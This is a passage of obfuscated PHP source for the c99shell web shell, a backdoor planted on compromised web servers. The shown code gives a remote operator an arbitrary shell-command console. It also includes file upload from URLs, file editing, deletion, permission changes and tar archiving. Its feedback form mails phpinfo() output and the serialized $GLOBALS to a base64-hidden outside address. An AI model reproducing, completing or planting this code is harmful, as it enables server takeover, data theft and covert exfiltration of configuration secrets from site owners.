htmlspecialchars($sp71092b) . '"</b>: access denied'; } else { $spabab30 = 'f'; $sp549585 = dirname($sp71092b); if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } $sp77bd8d = basename($sp71092b); } } else { $spabab30 = $sp3fc037 = 'ls'; } } if ($spabab30 == 'encoder') { echo '<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name="encoder" action="' . $sp4f5f94 . '" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name="encoder_input" id="input" cols=50 rows=5>' . @htmlspecialchars($spd301e8) . '</textarea><br><br><input type=submit value="calculate"><br><br></center><b>Hashes</b>:<br><center>'; foreach (array('md5', 'crypt', 'sha1', 'crc32') as $spc85aba) { echo $spc85aba . ' - <input type=text size=50 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . $spc85aba($spd301e8) . '" readonly><br>'; } echo '</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . urlencode($spd301e8) . '" readonly>
 <br>urldecode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . htmlspecialchars(urldecode($spd301e8)) . '" readonly>
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . base64_encode($spd301e8) . '" readonly></center>'; echo '<center>base64_decode - '; if (base64_encode(base64_decode($spd301e8)) != $spd301e8) { echo '<input type=text size=35 value="failed" disabled readonly>'; } else { $sp968889 = base64_decode($spd301e8); $sp968889 = str_replace(' ', '[0]', $sp968889); $sp62a453 = explode('
', $sp968889); $sp1098b7 = count($sp62a453); $sp968889 = htmlspecialchars($sp968889); if ($sp1098b7 == 1) { echo '<input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="' . $sp968889 . '" id="debase64" readonly>'; } else { $sp1098b7++; echo '<textarea cols="40" rows="' . $sp1098b7 . '" onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" id="debase64" readonly>' . $sp968889 . '</textarea>'; } echo '&nbsp;<a href="#" onclick="set_encoder_input(document.forms.encoder.debase64.value)"><b>^</b></a>'; } echo '</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus="this.select()" onMouseover="this.select()" onMouseout="this.select()" value="'; $spa89771 = strlen($spd301e8); for ($spc58e00 = 0; $spc58e00 < $spa89771; $spc58e00++) { $spf223f7 = dechex(ord($spd301e8[$spc58e00])); if ($spd301e8[$spc58e00] == '&') { echo $spd301e8[$spc58e00]; } elseif ($spd301e8[$spc58e00] != '\\') { echo '%' . $spf223f7; } } echo '" readonly><br></center></form>'; } if ($spabab30 == 'fsbuff') { $spb4cf51 = $sp597c2f['copy']; $spb1b319 = $sp597c2f['cut']; $spc5ba94 = array_merge($spb4cf51, $spb1b319); if (count($spc5ba94) == 0) { echo '<center><b>Buffer is empty!</b></center>'; } else { echo '<b>File-System buffer</b><br><br>'; $sp51f824 = $spc5ba94; $sp1f29e3 = TRUE; $spabab30 = 'ls'; } } if ($spabab30 == 'selfremove') { if ($sp58b8eb == $sp2585e5 and $sp58b8eb != '') { if (unlink(__FILE__)) { @ob_clean(); echo 'Thanks for using c99shell v.' . $sp703f1a . '!'; c99shexit(); } else { echo '<center><b>Can\'t delete ' . __FILE__ . '!</b></center>'; } } else { if (!empty($sp2585e5)) { echo '<b>Error: incorrect confimation!</b>'; } $sp835d5b = rand(0, 9) . rand(0, 9) . rand(0, 9); echo '<form action="' . $sp4f5f94 . '"><input type=hidden name=act value=selfremove><b>Self-remove: ' . __FILE__ . ' <br><b>Are you sure?<br>For confirmation, enter "' . $sp835d5b . '"</b>:&nbsp;<input type=hidden name=rndcode value="' . $sp835d5b . '"><input type=text name=submit>&nbsp;<input type=submit value="YES"></form>'; } } if ($spabab30 == 'update') { $sp6ec051 = c99sh_getupdate(!!$sp05b7ef); echo '<b>' . $sp6ec051 . '</b>'; if (stristr($sp6ec051, 'new version')) { echo '<br><br><input type=button onclick="location.href=\'' . $sp4f5f94 . 'act=update&confirmupdate=1\';" value="Update now">'; } } if ($spabab30 == 'feedback') { $spb6a9c3 = base64_decode('Yzk5c2hlbGxAY2N0ZWFtLnJ1'); if (!empty($sp58b8eb)) { $sp4618bd = substr(md5(microtime() + rand(1, 1000)), 0, 6); $sp5bb5c6 = 'c99shell v.' . $sp703f1a . ' feedback #' . $sp4618bd . '
Name: ' . htmlspecialchars($sp27a387) . '
E-mail: ' . htmlspecialchars($sp0def66) . '
Message:
' . htmlspecialchars($spf9133c) . '

IP: ' . $sp7d9d79; if (!empty($sp8fbc84)) { $sp13d1b2 = @ob_get_contents(); ob_clean(); phpinfo(); $spc3310d = base64_encode(ob_get_contents()); ob_clean(); echo $sp13d1b2; $sp5bb5c6 .= '
' . 'phpinfo(): ' . $spc3310d . '
' . '$GLOBALS=' . base64_encode(serialize($spd3aeac)) . '
'; } mail($spb6a9c3, 'c99shell v.' . $sp703f1a . ' feedback #' . $sp4618bd, $sp5bb5c6, 'FROM: ' . $spb6a9c3); echo '<center><b>Thanks for your feedback! Your ticket ID: ' . $sp4618bd . '.</b></center>'; } else { echo '<form action="' . $sp4f5f94 . '" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (' . str_replace(array('@', '.'), array('[at]', '[dot]'), $spb6a9c3) . '):<br><br>Your name: <input type="text" name="fdbk_name" value="' . htmlspecialchars($sp27a387) . '"><br><br>Your e-mail: <input type="text" name="fdbk_email" value="' . htmlspecialchars($sp0def66) . '"><br><br>Message:<br><textarea name="fdbk_body" cols=80 rows=10>' . htmlspecialchars($spf9133c) . '</textarea><input type="hidden" name="fdbk_ref" value="' . urlencode($sp8ba4f9) . '"><br><br>Attach server-info * <input type="checkbox" name="fdbk_servinf" value="1" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type="submit" name="submit" value="Send"></form>'; } } if ($spabab30 == 'search') { echo '<b>Search in file-system:</b><br>'; if (empty($sp1753c5)) { $sp1753c5 = $sp549585; } if (empty($sp018c54)) { $sp018c54 = '(.*)'; $sp86dc40 = 1; } if (empty($sp913cd1)) { $sp5e32cb = 0; } if (!empty($sp58b8eb)) { $sp012b41 = array(); $sp4e77c5 = 0; $sp14c2ea = 0; $spb7d4b8 = 0; $sp01bfa9 = 0; $sp62a453 = array('name' => $sp018c54, 'name_regexp' => $sp86dc40, 'text' => $sp9507d3, 'text_regexp' => $spe64eb5, 'text_wwo' => $sp913cd1, 'text_cs' => $sp66e185, 'text_not' => $spc6ce0c); $spc6ac8d = getmicrotime(); $sp0560b8 = array_unique(explode(';', $sp1753c5)); foreach ($sp0560b8 as $spc85aba) { c99fsearch($spc85aba); } $spc6ac8d = round(getmicrotime() - $spc6ac8d, 4); if (count($sp012b41) == 0) { echo '<b>No files found!</b>'; } else { $sp51f824 = $sp012b41; $sp1f29e3 = TRUE; $spabab30 = 'ls'; } } echo '<form method=POST>
<input type=hidden name="d" value="' . $sp0391b3 . '"><input type=hidden name=act value="' . $sp3fc037 . '">
<b>Search for (file/folder name): </b><input type="text" name="search_name" size="' . round(strlen($sp018c54) + 25) . '" value="' . htmlspecialchars($sp018c54) . '">&nbsp;<input type="checkbox" name="search_name_regexp" value="1" ' . ($sp86dc40 == 1 ? ' checked' : '') . '> - regexp
<br><b>Search in (explode ";"): </b><input type="text" name="search_in" size="' . round(strlen($sp1753c5) + 25) . '" value="' . htmlspecialchars($sp1753c5) . '">
<br><br><b>Text:</b><br><textarea name="search_text" cols="122" rows="10">' . htmlspecialchars($sp9507d3) . '</textarea>
<br><br><input type="checkbox" name="search_text_regexp" value="1" ' . ($sp5e32cb == 1 ? ' checked' : '') . '> - regexp
&nbsp;&nbsp;<input type="checkbox" name="search_text_wwo" value="1" ' . ($sp913cd1 == 1 ? ' checked' : '') . '> - <u>w</u>hole words only
&nbsp;&nbsp;<input type="checkbox" name="search_text_cs" value="1" ' . ($sp66e185 == 1 ? ' checked' : '') . '> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type="checkbox" name="search_text_not" value="1" ' . ($spc6ce0c == 1 ? ' checked' : '') . '> - find files <u>NOT</u> containing the text
<br><br><input type=submit name=submit value="Search"></form>'; if ($spabab30 == 'ls') { $sp3fc037 = $spabab30; echo '<hr size="1" noshade><b>Search took ' . $spc6ac8d . ' secs (' . $spb7d4b8 . ' files and ' . $sp01bfa9 . ' folders, ' . round(($spb7d4b8 + $sp01bfa9) / $spc6ac8d, 4) . ' objects per second).</b><br><br>'; } } if ($spabab30 == 'chmod') { $sp03a871 = fileperms($sp549585 . $sp77bd8d); if (!$sp03a871) { echo '<b>Change file-mode with error:</b> can\'t get current value.'; } else { $sp8e2b9f = TRUE; if ($sp68d777) { $sp5ea7c0 = '0' . base_convert(($sp59eaee['r'] ? 1 : 0) . ($sp59eaee['w'] ? 1 : 0) . ($sp59eaee['x'] ? 1 : 0) . ($sp07e377['r'] ? 1 : 0) . ($sp07e377['w'] ? 1 : 0) . ($sp07e377['x'] ? 1 : 0) . ($sp1f9818['r'] ? 1 : 0) . ($sp1f9818['w'] ? 1 : 0) . ($sp1f9818['x'] ? 1 : 0), 2, 8); if (chmod($sp549585 . $sp77bd8d, $sp5ea7c0)) { $spabab30 = 'ls'; $sp8e2b9f = FALSE; $sp1fec74 = ''; } else { $sp1fec74 = 'Can\'t chmod to ' . $sp5ea7c0 . '.'; } } if ($sp8e2b9f) { $spd88282 = parse_perms($sp03a871); echo '<b>Changing file-mode (' . $sp549585 . $sp77bd8d . '), ' . view_perms_color($sp549585 . $sp77bd8d) . ' (' . substr(decoct(fileperms($sp549585 . $sp77bd8d)), -4, 4) . ')</b><br>' . ($sp1fec74 ? '<b>Error:</b> ' . $sp1fec74 : '') . '<form action="' . $sp4f5f94 . '" method=POST><input type=hidden name=d value="' . htmlspecialchars($sp549585) . '"><input type=hidden name=f value="' . htmlspecialchars($sp77bd8d) . '"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1' . ($spd88282['o']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1' . ($spd88282['o']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1' . ($spd88282['o']['x'] ? ' checked' : '') . '>eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1' . ($spd88282['g']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1' . ($spd88282['g']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1' . ($spd88282['g']['x'] ? ' checked' : '') . '>eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1' . ($spd88282['w']['r'] ? ' checked' : '') . '>&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1' . ($spd88282['w']['w'] ? ' checked' : '') . '>&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1' . ($spd88282['w']['x'] ? ' checked' : '') . '>eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value="Save"></td></tr></table></form>'; } } } if ($spabab30 == 'upload') { $spe0fe90 = ''; $sp0fa7c0 = str_replace('\\', DIRECTORY_SEPARATOR, $sp0fa7c0); if (empty($sp0fa7c0)) { $sp0fa7c0 = $sp549585; } elseif (substr($sp0fa7c0, -1) != '/') { $sp0fa7c0 .= '/'; } if (!empty($sp58b8eb)) { global $spa53297; $spa761b0 = $spa53297['uploadfile']; if (!empty($spa761b0['tmp_name'])) { if (empty($spf49e26)) { $spe658d1 = $spa761b0['name']; } else { $spe658d1 = $sp122eee; } if (!move_uploaded_file($spa761b0['tmp_name'], $sp0fa7c0 . $spe658d1)) { $spe0fe90 .= 'Error uploading file ' . $spa761b0['name'] . ' (can\'t copy "' . $spa761b0['tmp_name'] . '" to "' . $sp0fa7c0 . $spe658d1 . '"!<br>'; } } elseif (!empty($sp31f65c)) { if (!empty($spf49e26)) { $spe658d1 = $spf49e26; } else { $spe658d1 = explode('/', $spe658d1); $spe658d1 = $spe658d1[count($spe658d1) - 1]; if (empty($spe658d1)) { $spc58e00 = 0; $sp47eda8 = ''; while (file_exists($sp0fa7c0 . $spe658d1)) { if ($spc58e00 > 0) { $sp47eda8 = '_' . $spc58e00; } $spe658d1 = 'index' . $sp47eda8 . '.html'; $spc58e00++; } } } if (!eregi('http://', $sp31f65c) and !eregi('https://', $sp31f65c) and !eregi('ftp://', $sp31f65c)) { echo '<b>Incorect url!</b><br>'; } else { $sp717247 = getmicrotime(); $sp15c035 = @file_get_contents($sp31f65c); $sp131f2e = round(getmicrotime() - $sp717247, 4); if (!$sp15c035) { $spe0fe90 .= 'Can\'t download file!<br>'; } else { if ($spe87a04) { $spa7106d = stat($sp0fa7c0 . $spe658d1); } $spe2e680 = fopen($sp0fa7c0 . $spe658d1, 'w'); if (!$spe2e680) { $spe0fe90 .= 'Error writing to file ' . htmlspecialchars($spe658d1) . '!<br>'; } else { fwrite($spe2e680, $sp15c035, strlen($sp15c035)); fclose($spe2e680); if ($spe87a04) { touch($sp0fa7c0 . $spe658d1, $spa7106d[9], $spa7106d[8]); } } } } } } if ($sp450e14) { echo '<b>' . $spe0fe90 . '</b>'; $spabab30 = 'ls'; } else { echo '<b>File upload:</b><br><b>' . $spe0fe90 . '</b><form enctype="multipart/form-data" action="' . $sp4f5f94 . 'act=upload&d=' . urlencode($sp549585) . '" method=POST>
Select file on your local computer: <input name="uploadfile" type="file"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Input URL: <input name="uploadurl" type="text" value="' . htmlspecialchars($sp31f65c) . '" size="70"><br><br>
Save this file dir: <input name="uploadpath" size="70" value="' . $sp0391b3 . '"><br><br>
File-name (auto-fill): <input name=uploadfilename size=25><br><br>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
<input type=submit name=submit value="Upload">
</form>'; } } if ($spabab30 == 'delete') { $sp40e63d = ''; foreach ($sp788e25 as $spc85aba) { $sp3b8eaf = FALSE; $sp3b8eaf = fs_rmobj($spc85aba); if (!$sp3b8eaf) { $sp40e63d .= 'Can\'t delete ' . htmlspecialchars($spc85aba) . '<br>'; } } if (!empty($sp40e63d)) { echo '<b>Deleting with errors:</b><br>' . $sp40e63d; } $spabab30 = 'ls'; } if (!$spb8d715) { if ($spabab30 == 'paste' or $spabab30 == 'copy' or $spabab30 == 'cut' or $spabab30 == 'unselect') { echo '<center><b>Sorry, buffer is disabled. For enable, set directive "$useFSbuff" as TRUE.</center>'; } } else { if ($spabab30 == 'copy') { $sp1fec74 = ''; $sp597c2f['copy'] = array_merge($sp597c2f['copy'], $sp788e25); c99_sess_put($sp597c2f); $spabab30 = 'ls'; } elseif ($spabab30 == 'cut') { $sp597c2f['cut'] = array_merge($sp597c2f['cut'], $sp788e25); c99_sess_put($sp597c2f); $spabab30 = 'ls'; } elseif ($spabab30 == 'unselect') { foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { if (in_array($spc85aba, $sp788e25)) { unset($sp597c2f['copy'][$spf38c9d]); } } foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { if (in_array($spc85aba, $sp788e25)) { unset($sp597c2f['cut'][$spf38c9d]); } } c99_sess_put($sp597c2f); $spabab30 = 'ls'; } if ($sp74a9a5) { $sp597c2f['copy'] = $sp597c2f['cut'] = array(); c99_sess_put($sp597c2f); } elseif ($sp79024c) { $spb46933 = ''; foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { $spb3d986 = $sp549585 . basename($spc85aba); if (!fs_copy_obj($spc85aba, $spb3d986)) { $spb46933 .= 'Can\'t copy ' . $spc85aba . ' to ' . $spb3d986 . '!<br>'; } if ($spc769f7) { unset($sp597c2f['copy'][$spf38c9d]); } } foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { $spb3d986 = $sp549585 . basename($spc85aba); if (!fs_move_obj($spc85aba, $spb3d986)) { $spb46933 .= 'Can\'t move ' . $spc85aba . ' to ' . $spb3d986 . '!<br>'; } unset($sp597c2f['cut'][$spf38c9d]); } c99_sess_put($sp597c2f); if (!empty($spb46933)) { echo '<b>Pasting with errors:</b><br>' . $spb46933; } $spabab30 = 'ls'; } elseif ($sp023b99) { $sp3ac197 = ''; if (substr($sp29e89f, -7, 7) == '.tar.gz') { $sp0beeb7 = '.tar.gz'; } else { $sp0beeb7 = '.tar.gz'; } if ($sp0beeb7 == '.tar.gz') { $sp36634b = 'tar cfzv'; } $sp36634b .= ' ' . $sp29e89f; $sp4bc2c6 = array_merge($sp597c2f['copy'], $sp597c2f['cut']); foreach ($sp4bc2c6 as $spc85aba) { $spc85aba = str_replace('\\', DIRECTORY_SEPARATOR, $spc85aba); if (substr($spc85aba, 0, strlen($sp549585)) == $sp549585) { $spc85aba = basename($spc85aba); } if (is_dir($spc85aba)) { if (substr($spc85aba, -1) != DIRECTORY_SEPARATOR) { $spc85aba .= DIRECTORY_SEPARATOR; } $spc85aba .= '*'; } $sp36634b .= ' ' . $spc85aba; } $sp13d1b2 = realpath('.'); chdir($sp549585); $sp6ec051 = myshellexec($sp36634b); chdir($sp13d1b2); if (empty($sp6ec051)) { $sp3ac197 .= 'Can\'t call archivator (' . htmlspecialchars(str2mini($sp36634b, 60)) . ')!<br>'; } $sp6ec051 = str_replace('
', '
', $sp6ec051); $sp6ec051 = explode('
', $sp6ec051); if ($spc769f7) { foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { unset($sp597c2f['copy'][$spf38c9d]); } } foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { if (in_array($spc85aba, $sp6ec051)) { fs_rmobj($spc85aba); } unset($sp597c2f['cut'][$spf38c9d]); } c99_sess_put($sp597c2f); if (!empty($sp3ac197)) { echo '<b>Archivation errors:</b><br>' . $sp3ac197; } $spabab30 = 'ls'; } elseif ($sp79024c) { $spb46933 = ''; foreach ($sp597c2f['copy'] as $spf38c9d => $spc85aba) { $spb3d986 = $sp549585 . basename($spc85aba); if (!fs_copy_obj($spc85aba, $sp549585)) { $spb46933 .= 'Can\'t copy ' . $spc85aba . ' to ' . $spb3d986 . '!<br>'; } if ($spc769f7) { unset($sp597c2f['copy'][$spf38c9d]); } } foreach ($sp597c2f['cut'] as $spf38c9d => $spc85aba) { $spb3d986 = $sp549585 . basename($spc85aba); if (!fs_move_obj($spc85aba, $sp549585)) { $spb46933 .= 'Can\'t move ' . $spc85aba . ' to ' . $spb3d986 . '!<br>'; } unset($sp597c2f['cut'][$spf38c9d]); } c99_sess_put($sp597c2f); if (!empty($spb46933)) { echo '<b>Pasting with errors:</b><br>' . $spb46933; } $spabab30 = 'ls'; } } if ($spabab30 == 'cmd') { if (trim($spa71965) == 'ps -aux') { $spabab30 = 'processes'; } elseif (trim($spa71965) == 'tasklist') { $spabab30 = 'processes'; } else { @chdir($sp76ab2a); if (!empty($sp58b8eb)) { echo '<b>Result of execution this command</b>:<br>'; $sp9ae14b = realpath('.'); @chdir($sp549585); $sp6ec051 = myshellexec($spa71965); $sp6ec051 = convert_cyr_string($sp6ec051, 'd', 'w'); if ($sp07f30d) { $sp1098b7 = count(explode('
', $sp6ec051)) + 1; if ($sp1098b7 < 10) { $sp1098b7 = 10; } echo '<br><textarea cols="122" rows="' . $sp1098b7 . '" readonly>' . htmlspecialchars($sp6ec051) . '</textarea>'; } else { echo $sp6ec051 . '<br>'; } @chdir($sp9ae14b); } else { echo '<b>Execution command</b>'; if (empty($sp07f30d)) { $sp07f30d = TRUE; } } echo '<form action="' . $sp4f5f94 . '" method=POST><input type=hidden name=act value=cmd><textarea name=cmd cols=122 rows=10>' . htmlspecialchars($spa71965) . '</textarea><input type=hidden name="d" value="' . $sp0391b3 . '"><br><br><input type=submit name=submit value="Execute">&nbsp;Display in text-area&nbsp;<input type="checkbox" name="cmd_txt" value="1"'; if ($sp07f30d) { echo ' checked'; } echo '></form>'; } } if ($spabab30 == 'ls') { if (count($sp51f824) > 0) { $sp10bc37 = $sp51f824; } else { $sp10bc37 = array(); if ($sp17341d = @opendir($sp549585)) { while (($sp5b8817 = readdir($sp17341d)) !== FALSE) { $sp10bc37[] = $sp549585 . $sp5b8817; } closedir($sp17341d); } else { } } if (count($sp10bc37) == 0) { echo '<center><b>Can\'t open folder (' . htmlspecialchars($sp549585) . ')!</b></center>'; } else { $sp4bc2c6 = array(); $sp799685 = 'f'; if ($sp799685 == 'f') { $sp4bc2c6['head'] = array(); $sp4bc2c6['folders'] = array(); $sp4bc2c6['links'] = array(); $sp4bc2c6['files'] = array(); foreach ($sp10bc37 as $spc85aba) { $sp5b8817 = basename($spc85aba); $spfe8f01 = array(); if ($sp5b8817 == '.') { $spfe8f01[] = $sp549585 . $sp5b8817; $spfe8f01[] = 'LINK'; } elseif ($sp5b8817 == '..') { $spfe8f01[] = $sp549585 . $sp5b8817; $spfe8f01[] = 'LINK'; } elseif (is_dir($spc85aba)) { if (is_link($spc85aba)) { $spf661d7 = 'LINK'; } else { $spf661d7 = 'DIR'; } $spfe8f01[] = $spc85aba; $spfe8f01[] = $spf661d7; } elseif (is_file($spc85aba)) { $spfe8f01[] = $spc85aba; $spfe8f01[] = filesize($spc85aba); } $spfe8f01[] = filemtime($spc85aba); if (!$sp919bf1) { $spd6aa15 = posix_getpwuid(fileowner($spc85aba)); $sp87a0ea = posix_getgrgid(filegroup($spc85aba)); $spfe8f01[] = ($spd6aa15['name'] ? $spd6aa15['name'] : fileowner($spc85aba)) . '/' . ($sp87a0ea['name'] ? $sp87a0ea['name'] : filegroup($spc85aba)); } $spfe8f01[] = fileperms($spc85aba); if ($sp5b8817 == '.' or $sp5b8817 == '..') { $sp4bc2c6['head'][] = $spfe8f01; } elseif (is_link($spc85aba)) { $sp4bc2c6['links'][] = $spfe8f01; } elseif (is_dir($spc85aba)) { $sp4bc2c6['folders'][] = $spfe8f01; } elseif (is_file($spc85aba)) { $sp4bc2c6['files'][] = $spfe8f01; } $spc58e00++; } $spfe8f01 = array(); $spfe8f01[] = '<b>Name</b>'; $spfe8f01[] = '<b>Size</b>'; $spfe8f01[] = '<b>Modify</b>'; if (!$sp919bf1) { $spfe8f01[] = '<b>Owner/Group</b>'; } $spfe8f01[] = '<b>Perms</b>'; $spfe8f01[] = '<b>Action</b>'; $spf295be = parsesort($spe057bf); $spe057bf = $spf295be[0] . $spf295be[1]; $spf38c9d = $spf295be[0]; if ($spf295be[1] != 'a') { $spf295be[1] = 'd'; } $spa9bfcb = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&sort=' . $spf38c9d . ($spf295be[1] == 'a' ? 'd' : 'a') . '">'; $spa9bfcb .= '<img src="' . $sp4f5f94 . 'act=img&img=sort_' . ($spe057bf[1] == 'a' ? 'asc' : 'desc') . '" height="9" width="14" alt="' . ($spf295be[1] == 'a' ? 'Asc.' : 'Desc') . '" border="0"></a>'; $spfe8f01[$spf38c9d] .= $spa9bfcb; for ($spc58e00 = 0; $spc58e00 < count($spfe8f01) - 1; $spc58e00++) { if ($spc58e00 != $spf38c9d) { $spfe8f01[$spc58e00] = '<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode($sp549585) . '&sort=' . $spc58e00 . $spf295be[1] . '">' . $spfe8f01[$spc58e00] . '</a>'; } } $spc85aba = $spf295be[0]; usort($sp4bc2c6['folders'], 'tabsort'); usort($sp4bc2c6['links'], 'tabsort'); usort($sp4bc2c6['files'], 'tabsort'); if ($spf295be[1] == 'd') { $sp4bc2c6['folders'] = array_reverse($sp4bc2c6['folders']); $sp4bc2c6['files'] = array_reverse($sp4bc2c6['files']); } $sp4bc2c6 = array_merge($sp4bc2c6['head'], $sp4bc2c6['folders'], $sp4bc2c6['links'], $sp4bc2c6['files']); $sp208cb5 = array(); $sp208cb5['cols'] = array($spfe8f01); $sp208cb5['head'] = array(); $sp208cb5['folders'] = array(); $sp208cb5['links'] = array(); $sp208cb5['files'] = array(); $spc58e00 = 0; foreach ($sp4bc2c6 as $sp62a453) { $spc85aba = $sp62a453[0]; $sp5b8817 = basename($spc85aba); $sp8c9f8e = dirname($spc85aba); if ($sp1f29e3) { $spfaecb8 = $spc85aba; } else { $spfaecb8 = $sp5b8817; } $spfaecb8 = str2mini($spfaecb8, 60); if (in_array($spc85aba, $sp597c2f['cut'])) { $spfaecb8 = '<strike>' . $spfaecb8 . '</strike>'; } elseif (in_array($spc85aba, $sp597c2f['copy'])) { $spfaecb8 = '<u>' . $spfaecb8 . '</u>'; } foreach ($sp35c514 as $sp7185b7) { if (ereg($sp7185b7[0], $sp5b8817)) { if (!is_numeric($sp7185b7[1]) or $sp7185b7[1] > 3) { $sp7185b7[1] = 0; ob_clean(); echo 'Warning! Configuration error in $regxp_highlight[' . $spf38c9d . '][0] - unknown command.'; c99shexit(); } else { $sp7185b7[1] = round($sp7185b7[1]); $spa7e08f = is_dir($spc85aba); if ($sp7185b7[1] == 0 or $sp7185b7[1] == 1 and !$spa7e08f or $sp7185b7[1] == 2 and !$spa7e08f) { if (empty($sp7185b7[2])) { $sp7185b7[2] = '<b>'; $sp7185b7[3] = '</b>'; } $spfaecb8 = $sp7185b7[2] . $spfaecb8 . $sp7185b7[3]; if ($sp7185b7[4]) { break; } } } } } $spfdfe9f = urlencode($sp5b8817); $sp75ab22 = urlencode($sp8c9f8e); $spdb6926 = urlencode($spc85aba); $spfe8f01 = array(); if ($sp5b8817 == '.') { $spfe8f01[] = '<img src="' . $sp4f5f94 . 'act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode(realpath($sp549585 . $sp5b8817)) . '&sort=' . $spe057bf . '">' . $sp5b8817 . '</a>'; $spfe8f01[] = 'LINK'; } elseif ($sp5b8817 == '..') { $spfe8f01[] = '<img src="' . $sp4f5f94 . 'act=img&img=ext_lnk" height="16" width="19" border="0">&nbsp;<a href="' . $sp4f5f94 . 'act=' . $sp3fc037 . '&d=' . urlencode(realpath($sp549585 . $sp5b8817)) . '&sort=' . $spe057bf . '">' . $sp5b8817 . '</a>'; $spfe8f01[] = 'LINK'; } elseif (is_dir($spc85aba)) { if (is_link($spc85aba)) { $spfaecb8 .= ' => ' . readlink($spc85aba); $spf661d7 = 'LINK'; $spfe8f01[] = '<img src="' . $sp4f5f94 . 'act=img&img=ext_lnk" height="16" width="16" border="0">&nbsp;<a href="' . $sp4f5f94 . 'act=ls&d=' . $spdb6926 . '&sort=' . $spe057bf . '">[' . $spfaecb8 . ']</a>'; } else { $spf661d7 = 'DIR'; $spfe8f01[] = '<img src="' . $sp4f5f94 . 'act=img&img=small_dir" height="16" width="19" border="0">&nbsp;<a href="' . $sp4f5f94 . 'act=ls&d=' . $spdb6926 . '&sort=' . $spe057bf . '">[' . $spfaecb8 . ']</a>'; } $spfe8f01[] = $spf661d7; } elseif (is_file($spc85aba)) { $sp0beeb7 = explode('.', $sp5b8817); $spa89771 = count($sp0beeb7) - 1; $sp0beeb7 = $sp0beeb7[$spa89771]; $sp0beeb7 = strtolower($sp0beeb7); $spfe8f01[] = '<img src="' . $sp4f5f94 . 'act=img&img=ext_' . $sp0beeb7 . '" border="0">&nbsp;<a href="' . $sp4f5f94 . 'act=f&f=' . $spfdfe9f . '&d=' . $sp75ab22 . '&">' . $spfaecb8 . '</a>'; $spfe8f01[] = view_size($sp62a453[1]); } $spfe8f01[] = date('d.m.Y H:i:s', $sp62a453[2]); if (!$sp919bf1) { $spfe8f01[] = $sp62a453[3]; } $spfe8f01[] = '<a href="' . $sp4f5f94 . 'act=chmod&f=' . $spfdfe9f . '&d=' . $sp75ab22 . '"><b>' . view_perms_color($spc85aba) . '</b></a>'; if ($sp5b8817 == '.') { $spc0b56c = '<input type="checkbox" name="actbox[]" onclick="ls_reverse_all();">'; $spc58e00--; } else { $spc0b56c = '<input type="checkbox" name="actbox[]" id="actbox' . $spc58e00 . '" value="' . htmlspecialchars($spc85aba) . '">'; } if (is_dir($spc85aba)) { $spfe8f01[] = '<a href="' . $sp4f5f94 . 'act=d&d=' . $spdb6926 . '"><img src="' . $sp4f5f94 . 'act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;' . $spc0b56c; } else { $spfe8f01[] = '<a href="' . $sp4f5f94 . 'act=f&f=' . $spfdfe9f . '&ft=info&d=' . $sp75ab22 . '"><img src="' . $sp4f5f94 . 'act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="' . $sp4f5f94 . 'act=f&f=' . $spfdfe9f . '&ft=edit&d=' . $sp75ab22 . '"><img src="' . $sp4f5f94 . 'act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="' . $sp4f5f94 . 'act=f&f=' . $spfdfe9f . '&ft=download&d=' . $sp75ab22 . '"><img src="' . $sp4f5f94 . 'act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;' . $spc0b56c; } if ($sp5b8817 == '.' or $sp5b8817 == '..') { $sp208cb5['head'][] = $spfe8f01; } elseif (is_link($spc85aba)) { $sp208cb5['links'][] = $spfe8f01; } elseif (is_dir($spc85aba)) { 